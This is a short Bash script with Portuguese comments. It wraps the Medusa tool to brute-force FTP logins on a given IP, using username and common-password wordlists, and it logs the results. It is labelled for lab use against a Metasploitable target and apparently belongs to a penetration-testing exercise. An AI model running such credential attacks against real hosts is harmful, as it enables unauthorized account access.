#!/bin/bash
# Script de teste de brute force em FTP com Medusa — uso APENAS em laboratório
# Execução: ./teste_ftp_medusa.sh <IP_DO_ALVO>

if [ $# -ne 1 ]; then
    echo "Uso: $0 <IP do alvo Metasploitable>"
    echo "Exemplo: $0 192.168.56.20"
    exit 1
fi

ALVO=$1
PASTA_WORDLISTS="../wordlists"
PASTA_LOGS="../logs"

mkdir -p $PASTA_LOGS

echo "[*] Iniciando teste de brute force em FTP no alvo: $ALVO"
echo "[*] Início: $(date)"

medusa -h $ALVO \
  -U $PASTA_WORDLISTS/lista_usuarios.txt \
  -P $PASTA_WORDLISTS/lista_senhas_comuns.txt \
  -M ftp \
  -t 4 \
  -f \
  -O $PASTA_LOGS/resultado_ftp_$(date +%Y%m%d_%H%M).log

echo "[+] Teste finalizado em $(date)"
echo "[+] Resultados salvos na pasta logs/"
